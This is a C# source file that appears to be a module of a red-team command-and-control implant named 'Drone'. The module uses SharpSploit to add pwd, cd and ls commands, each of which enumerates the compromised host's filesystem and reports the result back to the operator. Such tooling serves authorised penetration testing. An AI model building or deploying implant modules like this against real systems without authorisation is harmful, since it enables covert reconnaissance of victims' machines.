using System;
using System.IO;
using System.Threading;

using Drone.Models;
using Drone.SharpSploit.Enumeration;

namespace Drone.Modules
{
    public class FileSystemModule : DroneModule
    {
        public override string Name { get; } = "fs";
        
        public override void AddCommands()
        {
            var pwd = new Command("pwd", "Print current working directory", GetCurrentDirectory);
            
            var cd = new Command("cd", "Change working directory", ChangeDirectory);
            cd.Arguments.Add(new Command.Argument("dir"));
            
            var ls = new Command("ls", "List files and directories", ListFileSystem);
            ls.Arguments.Add(new Command.Argument("dir"));

            Commands.Add(pwd);
            Commands.Add(cd);
            Commands.Add(ls);
        }

        private void GetCurrentDirectory(DroneTask task, CancellationToken token)
        {
            var result = Host.GetCurrentDirectory();
            Drone.SendResult(task.TaskGuid, result);
        }
        
        private void ChangeDirectory(DroneTask task, CancellationToken token)
        {
            var directory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
            if (task.Arguments.Length > 0) directory = task.Arguments[0];
            
            SharpSploit.Enumeration.Host.ChangeCurrentDirectory(directory);
            var current = Host.GetCurrentDirectory();
            Drone.SendResult(task.TaskGuid, current);
        }

        private void ListFileSystem(DroneTask task, CancellationToken token)
        {
            var directory = Directory.GetCurrentDirectory();
            if (task.Arguments.Length > 0) directory = task.Arguments[0];

            var result = Host.GetDirectoryListing(directory);
            
            Drone.SendResult(task.TaskGuid, result.ToString());
        }
    }
}